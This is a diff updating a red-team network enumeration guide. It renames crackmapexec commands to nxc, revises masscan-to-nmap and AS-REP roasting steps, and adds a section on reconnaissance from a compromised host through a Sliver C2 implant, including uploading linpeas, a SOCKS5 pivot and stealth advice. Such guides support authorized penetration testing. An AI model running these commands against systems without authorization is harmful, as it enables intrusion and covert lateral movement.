@@ -1,6 +1,7 @@
 ---
 tags: [redteam, enumeration, recon, network, guide, nmap]
 created: 2026-04-29
+updated: 2026-05-02
 author: clawd
 ---
 
@@ -138,11 +139,14 @@ rustscan -a 10.0.0.0/24 --ulimit 5000 -t 2000 -- -sV -oA rustscan_detailed
 
 ```bash
 # Masscan for speed, output to nmap for service enum
+# Method 1: List output → host list → nmap
 masscan -p1-65535 10.0.0.0/24 --rate=10000 -oL masscan_out.txt
+grep '^open' masscan_out.txt | awk '{print $4}' | sort -u > live_hosts.txt
+nmap -sV -iL live_hosts.txt -oA masscan_nmap_detailed
 
-# Parse masscan output into nmap-readable format
+# Method 2: XML output → NSE targets-xml script
 masscan -p1-65535 10.0.0.0/24 --rate=10000 -oX masscan.xml
-nmap -sV -iX masscan.xml -oA masscan_nmap_detailed
+nmap --script targets-xml --script-arg newtargets --script-arg xmlfile=masscan.xml -sV -oA masscan_nmap_detailed
 ```
 
 ### Service Banner Grabbing
@@ -284,6 +288,64 @@ systemctl list-units --type=service --state=running
 
 ---
 
+### Enumeration from a Sliver C2 Implant
+
+When you have a Sliver implant on a target, you can perform network reconnaissance directly from the compromised host — no need to upload additional tools.
+
+```sliver
+# Basic host recon
+use <session-id>
+whoami
+getuid
+getpid
+ps
+ifconfig
+netstat
+
+# Discover other hosts on the segment
+shell arp -a                    # Windows ARP cache
+shell ip neigh show             # Linux ARP cache
+shell net view                  # Windows — discover hosts/shares
+shell nltest /dclist:CORP       # Windows — list domain controllers
+
+# Port scan from the implant (no nmap needed)
+shell for /L %i in (1,1,254) do @ping -n 1 -w 100 10.0.0.%i > nul && echo 10.0.0.%i  # Windows ping sweep
+shell for i in $(seq 1 254); do ping -c 1 -W 1 10.0.0.$i && echo 10.0.0.$i; done  # Linux ping sweep
+
+# Service banner grab from implant
+shell nc -zv 10.0.0.1 21-25,80,443,445,3389 2>&1 | grep succeeded
+
+# Windows: enumerate shares, users, sessions
+shell net share
+shell net user
+shell net localgroup administrators
+shell net session
+
+# Windows: PowerShell recon (no file drop)
+shell powershell -c "Get-NetAdapter | Select Name,Status,LinkSpeed"
+shell powershell -c "Get-NetTCPConnection | Where State -eq Listen | Select LocalAddress,LocalPort"
+shell powershell -c "Get-Process | Select Name,Id,Path | Sort Name"
+
+# Linux: enumerate network and services
+shell ss -tlnp
+shell cat /etc/hosts
+shell find /etc -name "*.conf" -type f 2>/dev/null | head -20
+
+# Upload tools for deeper enum (if needed)
+upload /opt/linpeas.sh /tmp/linpeas.sh
+shell chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
+
+# Pivot through implant for internal scanning
+socks5 --bind 127.0.0.1:1080
+# Then from operator machine:
+# proxychains nmap -sT -p 22,80,443,445,3389 10.0.0.0/24
+```
+
+> [!tip] Sliver Advantage
+> Running recon from the implant is stealthier than scanning from your attack box — the traffic originates from an internal host and blends with normal network activity. Use `shell` for quick checks and `upload` + `execute` for deeper enumeration tools.
+
+---
+
 ## Protocol-Specific Deep Dives
 
 ### SMB (Ports 139, 445)
@@ -336,20 +398,23 @@ rpcclient $> srvinfo
 
 > 💡 **Tip**: Null sessions (anonymous SMB connections) still work on misconfigured systems. Always try `-N` (no password) first.
 
-#### CrackMapExec / NetExec
+#### CrackMapExec / NetExec (nxc)
+
+> [!info] Tool Update
+> **CrackMapExec (CME)** was forked and renamed to **NetExec (`nxc`)** in 2023+. The original repository is no longer maintained. Kali now ships `netexec` as the primary package. The `crackmapexec` command still works as a backwards-compatible alias, but `nxc` is the recommended invocation.
 
 ```bash
 # SMB enumeration
-crackmapexec smb 10.0.0.0/24 -u '' -p ''
+nxc smb 10.0.0.0/24 -u '' -p ''
 
 # With credentials
-crackmapexec smb 10.0.0.0/24 -u 'user' -p 'pass' --shares
-crackmapexec smb 10.0.0.0/24 -u 'user' -p 'pass' --users
-crackmapexec smb 10.0.0.0/24 -u 'user' -p 'pass' --groups
-crackmapexec smb 10.0.0.0/24 -u 'user' -p 'pass' --pass-pol
+nxc smb 10.0.0.0/24 -u 'user' -p 'pass' --shares
+nxc smb 10.0.0.0/24 -u 'user' -p 'pass' --users
+nxc smb 10.0.0.0/24 -u 'user' -p 'pass' --groups
+nxc smb 10.0.0.0/24 -u 'user' -p 'pass' --pass-pol
 
 # Session check
-crackmapexec smb 10.0.0.1 -u 'user' -p 'pass' --sessions
+nxc smb 10.0.0.1 -u 'user' -p 'pass' --sessions
 ```
 
 ### LDAP (Ports 389, 636)
@@ -404,7 +469,7 @@ bloodhound-python -d corp.local -u user -p pass -ns 10.0.0.1 -c All
 dnsenum target.com
 
 # With zone transfer attempt and brute force
-dnsenum --enum -f /usr/share/wordlists/dns.txt target.com
+dnsenum -f /usr/share/wordlists/dns.txt target.com
 ```
 
 #### dnsrecon
@@ -580,8 +645,8 @@ ssh -v -o PreferredAuthentications=none -o PubkeyAuthentication=no user@10.0.0.1
 # Nmap RDP scripts
 nmap -sV -p 3389 --script=rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 10.0.0.1
 
-# Credencialed RDP check
-crackmapexec rdp 10.0.0.0/24 -u 'user' -p 'pass'
+# Credentialed RDP check
+nxc rdp 10.0.0.0/24 -u 'user' -p 'pass'
 
 # xfreerdp banner
 xfreerdp /v:10.0.0.1 /cert:ignore +auth-only
@@ -699,9 +764,13 @@ done < live_hosts.txt
 smbclient //10.0.0.1/share -N -c "ls" 2>/dev/null | grep -i ".bak"
 
 # Quick Kerberos pre-auth check (AS-REP roastable)
+# Modern Kali uses impacket- prefixed commands
 for user in $(cat users.txt); do
-    python3 /opt/impacket/GetNPUsers.py "corp.local/$user" -no-pass -dc-ip 10.0.0.1 2>/dev/null | grep -v "not found"
+    impacket-GetNPUsers "corp.local/$user" -no-pass -dc-ip 10.0.0.1 2>/dev/null | grep -v "not found"
 done
+
+# Alternative: manual install path (if not using Kali repos)
+# python3 /opt/impacket/GetNPUsers.py "corp.local/$user" -no-pass -dc-ip 10.0.0.1
 ```
 
 ### Python — Network Sweep Script
@@ -1026,12 +1095,12 @@ tcpdump -i eth0 -nn -c 1000 'src host YOUR_IP' 2>&1 | tail -1
 | **Port 161 open (SNMP)** | Community string brute, full walk | `onesixtyone`, `snmpwalk` |
 | **Port 389/636 open** | LDAP dump, BloodHound collection | `ldapsearch`, `bloodhound-python` |
 | **Port 88 open (Kerberos)** | User enum, AS-REP roast, Kerberoast | `kerbrute`, `GetNPUsers`, `GetUserSPNs` |
-| **Port 1433 open (MSSQL)** | Default creds, SQL auth brute | `crackmapexec mssql`, `mssqlclient.py` |
+| **Port 1433 open (MSSQL)** | Default creds, SQL auth brute | `nxc mssql`, `mssqlclient.py` |
 | **Port 3306 open (MySQL)** | Default creds, auth bypass | `mysql -u root`, `nmap --script mysql-vuln*` |
-| **Port 3389 open (RDP)** | Auth check, NLA status | `crackmapexec rdp`, `nmap --script rdp-*` |
+| **Port 3389 open (RDP)** | Auth check, NLA status | `nxc rdp`, `nmap --script rdp-*` |
 | **Port 22 open (SSH)** | Key fingerprint, auth methods | `ssh-audit`, `ssh-keyscan` |
 | **Port 25 open (SMTP)** | User enum, open relay | `smtp-user-enum`, `nmap --script smtp-*` |
-| **Port 5985/5986 (WinRM)** | Auth check, shell access | `crackmapexec winrm`, `evil-winrm` |
+| **Port 5985/5986 (WinRM)** | Auth check, shell access | `nxc winrm`, `evil-winrm` |
 | **Null SMB session** | Full share/user/group enum | `enum4linux -a`, `rpcclient` |
 | **SNMP community string** | Full MIB walk, process list, software | `snmpwalk -c <string>` |
 | **Writable SMB share** | Search for creds, configs, scripts | `smbclient`, mount and `find` |
@@ -1123,22 +1192,27 @@ bloodhound-python -d corp.local -u user -p pass -ns 10.0.0.1 -c All
 
 ### CrackMapExec / NetExec Cheat Sheet
 
+> [!info] NetExec (`nxc`) is the successor to CrackMapExec. `crackmapexec` still works as an alias.
+
 ```bash
 # SMB
-crackmapexec smb 10.0.0.0/24 -u '' -p ''          # Null session
-crackmapexec smb 10.0.0.0/24 -u user -p pass --shares
-crackmapexec smb 10.0.0.0/24 -u user -p pass --users
-crackmapexec smb 10.0.0.0/24 -u user -p pass --pass-pol
-crackmapexec smb 10.0.0.0/24 -u user -p pass --loggedon-users
+nxc smb 10.0.0.0/24 -u '' -p ''          # Null session
+nxc smb 10.0.0.0/24 -u user -p pass --shares
+nxc smb 10.0.0.0/24 -u user -p pass --users
+nxc smb 10.0.0.0/24 -u user -p pass --pass-pol
+nxc smb 10.0.0.0/24 -u user -p pass --loggedon-users
 
 # WinRM
-crackmapexec winrm 10.0.0.0/24 -u user -p pass
+nxc winrm 10.0.0.0/24 -u user -p pass
 
 # MSSQL
-crackmapexec mssql 10.0.0.0/24 -u sa -p '' --query "SELECT name FROM sys.databases"
+nxc mssql 10.0.0.0/24 -u sa -p '' --query "SELECT name FROM sys.databases"
 
 # SSH
-crackmapexec ssh 10.0.0.0/24 -u user -p pass
+nxc ssh 10.0.0.0/24 -u user -p pass
+
+# RDP
+nxc rdp 10.0.0.0/24 -u user -p pass
 ```
 
 ### OPSEC Quick Reference
